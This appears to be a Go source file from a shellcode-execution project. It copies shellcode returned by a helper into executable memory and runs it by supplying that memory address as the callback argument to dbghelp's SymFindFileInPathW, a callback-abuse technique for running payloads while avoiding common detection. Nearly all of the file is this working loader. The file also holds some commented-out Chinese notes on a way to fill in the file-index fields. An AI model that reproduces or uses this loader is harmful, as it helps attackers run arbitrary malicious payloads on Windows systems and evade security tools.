package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"C"
	"fmt"
	"syscall"
	"unsafe"
)

var (
	kernel32               = syscall.NewLazyDLL("kernel32.dll")
	dbghelp                = syscall.NewLazyDLL("dbghelp.dll")
	virtualAlloc           = kernel32.NewProc("VirtualAlloc")
	getCurrentProcess      = kernel32.NewProc("GetCurrentProcess")
	symInitialize          = dbghelp.NewProc("SymInitialize")
	symSrvGetFileIndexInfo = dbghelp.NewProc("SymSrvGetFileIndexInfo")
	symFindFileInPath      = dbghelp.NewProc("SymFindFileInPathW")
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	SSRVOPT_DWORDPTR       = 4
	MAX_PATH               = 260
)

type SYMSRV_INDEX_INFO struct {
	SizeOfStruct uint32
	File         [MAX_PATH + 1]byte
	Stripped     uint32
	Timestamp    uint32
	Size         uint32
	Dbgfile      [MAX_PATH + 1]byte
	Pdbgfile     [MAX_PATH + 1]byte
	GUID         [16]byte
	Sig          uint32
	Age          uint32
}

func stringToBytePtr(s string) *byte {
	b := make([]byte, len(s)+1)
	copy(b, s)
	return &b[0]
}

func Run(op []byte) {

	address, _, _ := virtualAlloc.Call(0, uintptr(len(op)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if address == 0 {
		fmt.Println("Error allocating memory")
		return
	}

	copy((*[1 << 30]byte)(unsafe.Pointer(address))[:], op)
	hProcess, _, _ := getCurrentProcess.Call()
	r1, _, err := symInitialize.Call(hProcess, 0, 1)
	if r1 == 0 {
		fmt.Printf("Error initializing symbol handler: %v\n", err)
		return
	}

	var finfo = SYMSRV_INDEX_INFO{}
	finfo.SizeOfStruct = uint32(unsafe.Sizeof(finfo))

	ptr := uintptr(unsafe.Pointer(C.CString(`C:\Windows\System32\kernel32.dll`)))

	r1, _, err = symSrvGetFileIndexInfo.Call(ptr, uintptr(unsafe.Pointer(&finfo)), 0)
	if r1 == 0 {
		fmt.Printf("Error getting file index info: %v\n", err)
		return
	}

	////symSrvGetFileIndexInfo 替代实现

	//finfo.Timestamp = 3435973836
	////获取文件信息
	//fileInfo, err := os.Stat("C:\\Windows\\System32\\kernel32.dll")
	//if err != nil {
	//	fmt.Println("Error:", err)
	//	return
	//}
	//fileSize := fileInfo.Size()
	//fmt.Printf("文件大小: %d 字节\n", fileSize)
	//
	//// 获取文件修改时间
	//fileModTime := fileInfo.ModTime()
	//fmt.Printf("文件修改时间: %v\n", fileModTime)
	//
	//// 如果需要将修改时间转换为 Unix 时间戳
	//fileModUnix := fileModTime.Unix()
	//fmt.Printf("文件修改 Unix 时间戳: %d\n", fileModUnix)
	//finfo.Size = uint32(fileSize)
	//finfo.Timestamp = uint32(fileModUnix)

	var dummy [MAX_PATH]uint16

	//不可行
	//ptrs32 := uintptr(unsafe.Pointer(C.CString(`C:\Windows\System32`)))
	ptrs32, _ := syscall.UTF16PtrFromString("C:\\Windows\\System32")
	ptrkernel32, _ := syscall.UTF16PtrFromString("kernel32.dll")

	r1, _, err = symFindFileInPath.Call(hProcess,
		uintptr(unsafe.Pointer(ptrs32)),
		uintptr(unsafe.Pointer(ptrkernel32)),
		uintptr(unsafe.Pointer(&finfo.Timestamp)),
		uintptr(finfo.Size), 0, 4,
		uintptr(unsafe.Pointer(&dummy)), address,
		0)

	if r1 == 0 {
		fmt.Printf("Error finding file in path: %s\n", err)
		return
	}
}

func main() {
	Run(util.ShellCode())
}
